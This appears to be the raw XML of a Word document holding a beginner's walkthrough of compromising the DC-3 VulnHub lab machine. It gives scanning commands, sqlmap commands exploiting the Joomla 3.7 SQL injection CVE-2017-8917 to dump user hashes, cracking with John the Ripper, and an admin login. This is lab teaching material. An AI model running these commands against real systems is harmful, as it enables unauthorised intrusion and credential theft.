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A38474" w14:textId="71324071" w:rsidR="009F0233" w:rsidRPr="00DE751D" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Hlk201073768"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r w:rsidRPr="00DE751D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">DC-3 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DE751D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>VulnHub</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DE751D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Exploitation Walkthrough</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491D1D19" w14:textId="10041759" w:rsidR="009F0233" w:rsidRDefault="00DE751D">
      <w:r>
        <w:t xml:space="preserve">Author: Nabin Dhungana – Cybersecurity Researcher </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Date: June 17, 2025</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF22271" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="70204B80" w14:textId="77777777" w:rsidR="009F0233" w:rsidRPr="00DE751D" w:rsidRDefault="00000000" w:rsidP="00DE751D">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Abstract</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21FD507C" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:r>
        <w:t>This document presents a comprehensive, beginner-friendly walkthrough of exploiting the DC-3 virtual machine from VulnHub. Using step-by-step instructions, the guide walks through reconnaissance, web stack enumeration, SQL injection discovery, database exploitation, hash cracking, and gaining administrative access to the target Joomla-based web application. The walkthrough is intended for students and professionals learning penetration testing techniques.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E055694" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD721B6" w14:textId="635D5EFA" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">DC-3 is a virtual machine created for ethical hacking practice. It simulates real-world misconfigurations on a web application running Joomla CMS. The goal is to gain administrator access by identifying and exploiting security weaknesses. This walkthrough is crafted for individuals at all skill levels, who are </w:t>
      </w:r>
      <w:r w:rsidR="00DE751D">
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:t>their journey into penetration testing and cybersecurity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41353AEE" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Lab Environment Setup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304B1BDB" w14:textId="1D50C5DA" w:rsidR="00DE751D" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Before beginning, ensure you have the following:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">1. DC-3 VM downloaded from: </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE751D">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>https://www.vulnhub.com/entry/dc-32,312</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>2. VirtualBox or VMware to run both attacker (e.g., Kali Linux) and victim machines</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>3. Ensure both VMs are on the same Host-Only or NAT network for communication</w:t>
      </w:r>
      <w:r w:rsidR="00DE751D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="15B09937" wp14:editId="32F287CE">
            <wp:extent cx="2113334" cy="1014852"/>
            <wp:effectExtent l="0" t="0" r="1270" b="0"/>
            <wp:docPr id="3606971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97110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617" cy="1021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C7E5F" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033E117A" w14:textId="77777777" w:rsidR="00DE751D" w:rsidRPr="004F7614" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The first step is to identify the IP address of the DC-3 machine using Netdiscover, which detects devices on the same network.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>netdiscover</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -r 192.168.150.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B34F1D" w14:textId="2DB26218" w:rsidR="00DE751D" w:rsidRDefault="00DE751D">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1992A755" wp14:editId="3D15C08D">
            <wp:extent cx="4256285" cy="1047701"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>
            <wp:docPr id="1123439343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39343" name="Picture 3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562" cy="106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After finding the target’s IP, we use Nmap for a full port and service scan:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>sC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -T4 -p- -oA dc3_scan 192.168.150.130</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- -sC: default scripts</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- -sV: version detection</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- -T4: faster execution</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- -p-: scans all ports</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>oA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>: output in multiple formats</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A48EF63" w14:textId="2F6A07C4" w:rsidR="009F0233" w:rsidRDefault="00DE751D">
      <w:r w:rsidRPr="009D15FD">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C817EF0" wp14:editId="7EEF760E">
            <wp:extent cx="4608768" cy="1532894"/>
            <wp:effectExtent l="0" t="0" r="1905" b="0"/>
            <wp:docPr id="156325804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58041" name="Picture 1" descr="A computer screen shot of a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5656" cy="154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Result: Only port 80 is open, and Apache web server is running. Joomla is detected as the CMS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B145998" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Web Stack Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F2AFD43" w14:textId="77777777" w:rsidR="00BF44D6" w:rsidRPr="004F7614" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To learn more about the website's technology stack, we use WhatWeb:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">whatweb </w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:history="1">
        <w:r w:rsidR="00BF44D6" w:rsidRPr="004F7614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:i/>
            <w:iCs/>
          </w:rPr>
          <w:t>http://192.168.150.130</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46BDF1A3" w14:textId="54E9BD43" w:rsidR="009F0233" w:rsidRDefault="00BF44D6">
      <w:r w:rsidRPr="009D15FD">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="49B1D5BD" wp14:editId="4A941C9B">
            <wp:extent cx="5486400" cy="277263"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="210137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790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WhatWeb reveals:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- CMS: Joomla</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Server: Apache 2.4.18</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- PHP: 5.6.4</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- OS: Ubuntu 16.04</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Knowing this stack helps us search for specific vulnerabilities that affect outdated Joomla or Apache versions. As we found Joomla 3.7 version through README.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A83EA45" w14:textId="3FC414B4" w:rsidR="00BF44D6" w:rsidRPr="00BF44D6" w:rsidRDefault="00BF44D6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="605B0372" wp14:editId="22FE48B2">
            <wp:extent cx="5486400" cy="1176137"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>
            <wp:docPr id="135918201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82011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7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BD6BF" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>SQL Injection Discovery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B8AD59" w14:textId="0FF24F0C" w:rsidR="00BF44D6" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Using search engines or ExploitDB, we discover that this Joomla version is vulnerable to CVE-2017-8917. It allows unauthenticated SQL </w:t>
      </w:r>
      <w:r w:rsidR="00BF44D6">
        <w:t>injections</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73874EC3" w14:textId="01F09C86" w:rsidR="00BF44D6" w:rsidRDefault="00BF44D6">
      <w:r>
        <w:t>For this CVE we use exploit-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>db</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, as it describes the payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C126941" w14:textId="1B09B404" w:rsidR="00BF44D6" w:rsidRDefault="00BF44D6">
      <w:hyperlink r:id="rId14" w:history="1">
        <w:r w:rsidRPr="00E27451">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:i/>
            <w:iCs/>
          </w:rPr>
          <w:t>https://www.exploit-db.com/exploits/42033</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="60372E5F" w14:textId="77777777" w:rsidR="00BF44D6" w:rsidRDefault="00BF44D6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007839CA">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7BAC07BC" wp14:editId="1A045047">
            <wp:extent cx="5486400" cy="1627347"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="12995639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6395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We use SQLMap to test and exploit the injection point:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>sqlmap -u "http://192.168.150.X/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159A6A1B" w14:textId="2832B67C" w:rsidR="009F0233" w:rsidRDefault="00BF44D6">
      <w:r w:rsidRPr="00421F95">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="74BC45C0" wp14:editId="3748646A">
            <wp:extent cx="5486400" cy="502334"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="31507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773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The command tests deep SQLi payloads against the URL. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLMap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> confirms vulnerability and lists databases including '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>joomladb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>'.</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF44D6">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B36BFF">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0ED2619C" wp14:editId="73088560">
            <wp:extent cx="5486400" cy="1909445"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1531450536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50536" name="Picture 1" descr="A computer screen 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5915" w14:textId="1A2757E3" w:rsidR="00BF44D6" w:rsidRDefault="00BF44D6">
      <w:r>
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>output</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> reveals database names.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE54614" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Database Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0889EE" w14:textId="11E393B6" w:rsidR="004F7614" w:rsidRDefault="00000000">
      <w:r>
        <w:t>We now explore the contents of 'joomladb' using SQLMap to identify tables:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -u "..." --risk=3 --level=5 --random-agent -D </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>joomladb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> --tables</w:t>
      </w:r>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="004F7614" w:rsidRPr="003E6926">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4671C002" wp14:editId="7D28CB66">
            <wp:extent cx="5486400" cy="597291"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="801800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006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F7614" w:rsidRPr="00421F95">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="62A66CA8" wp14:editId="3E02C0D6">
            <wp:extent cx="3134162" cy="3562847"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="214302324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23241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56E9" w14:textId="0AACACC9" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">A table </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>named '#</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>__users' appears, which likely stores Joomla user data. We dump the username, password, and email columns:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -u "..." --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T '#__users' -C </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>id,name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>username,email</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>,password --dump</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>The result contains hashed passwords.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A5E41E" w14:textId="47C07E53" w:rsidR="004F7614" w:rsidRDefault="004F7614">
      <w:r w:rsidRPr="003E6926">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3EBB1337" wp14:editId="13BC143F">
            <wp:extent cx="5486400" cy="735623"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="114680591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05914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6963" w14:textId="400F13CE" w:rsidR="004F7614" w:rsidRDefault="004F7614">
      <w:r w:rsidRPr="003E6926">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1D77A9DE" wp14:editId="6097332B">
            <wp:extent cx="5486400" cy="783102"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="517857433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57433" name="Picture 1" descr="A computer screen shot of a computer cod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2D32" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Password Hash Cracking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5755345A" w14:textId="77777777" w:rsidR="004F7614" w:rsidRDefault="00000000">
      <w:r>
        <w:t>We use John the Ripper to crack the hashes extracted from the Joomla database.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>john --wordlist=/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/share/wordlists/rockyou.txt hash.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE79714" w14:textId="04F45F75" w:rsidR="009F0233" w:rsidRDefault="004F7614">
      <w:r w:rsidRPr="00641002">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="614EB58D" wp14:editId="60C44D4A">
            <wp:extent cx="5486400" cy="1172894"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:docPr id="1174439645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39645" name="Picture 1" descr="A computer screen shot of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After some time, John reveals the plaintext password for the admin user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E81E131" w14:textId="44C7A458" w:rsidR="004F7614" w:rsidRDefault="004F7614">
      <w:r w:rsidRPr="00641002">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="39F8B004" wp14:editId="14856073">
            <wp:extent cx="4419600" cy="1019908"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="2132739724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39724" name="Picture 1" descr="A screen shot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4707" cy="102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B1C7" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Accessing the Admin Panel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7100257D" w14:textId="2686F52D" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Now we look for the admin login page using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Gobuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> for directory brute force:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>gobuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -u http://192.168.150.X -w /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/share/wordlists/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dirb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/common.txt</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="004F7614" w:rsidRPr="00641002">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1EA8B658" wp14:editId="75BB1E51">
            <wp:extent cx="4834995" cy="2437643"/>
            <wp:effectExtent l="0" t="0" r="3810" b="1270"/>
            <wp:docPr id="327839414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39414" name="Picture 1" descr="A computer screen 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6194" cy="244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Discovered path: /administrator</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>We visit this page and successfully log in using the cracked admin credentials.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0304CCE1" w14:textId="363651D6" w:rsidR="004F7614" w:rsidRDefault="004F7614">
      <w:r w:rsidRPr="0058192E">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5CEE5F8C" wp14:editId="2914D481">
            <wp:extent cx="5486400" cy="1237371"/>
            <wp:effectExtent l="0" t="0" r="0" b="1270"/>
            <wp:docPr id="11347703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70337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128A" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F301CA" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">This walkthrough demonstrates how misconfigurations and outdated software like Joomla can be exploited by attackers. Each stage – from reconnaissance to SQL injection and admin panel access – highlights the need for regular patching and proper access </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>controls. The report emphasizes a clear, beginner-friendly approach to make cybersecurity learning more accessible.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03986B11" w14:textId="77777777" w:rsidR="009F0233" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09502600" w14:textId="77777777" w:rsidR="009F0233" w:rsidRPr="004F7614" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Exploit Database. (2017). CVE-2017-8917 - Joomla com_fields SQL Injection. https://www.exploit-db.com/exploits/42033</w:t>
      </w:r>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:br/>
        <w:t>VulnHub. (n.d.). DC-3 VM. https://www.vulnhub.com/entry/dc-32,312</w:t>
      </w:r>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:br/>
        <w:t>OWASP. (n.d.). SQL Injection. https://owasp.org/www-community/attacks/SQL_Injection</w:t>
      </w:r>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:br/>
        <w:t>SQLMap. (n.d.). Automatic SQL injection tool. https://sqlmap.org</w:t>
      </w:r>
      <w:r w:rsidRPr="004F7614">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:br/>
        <w:t>John the Ripper. (n.d.). https://www.openwall.com/john/</w:t>
      </w:r>
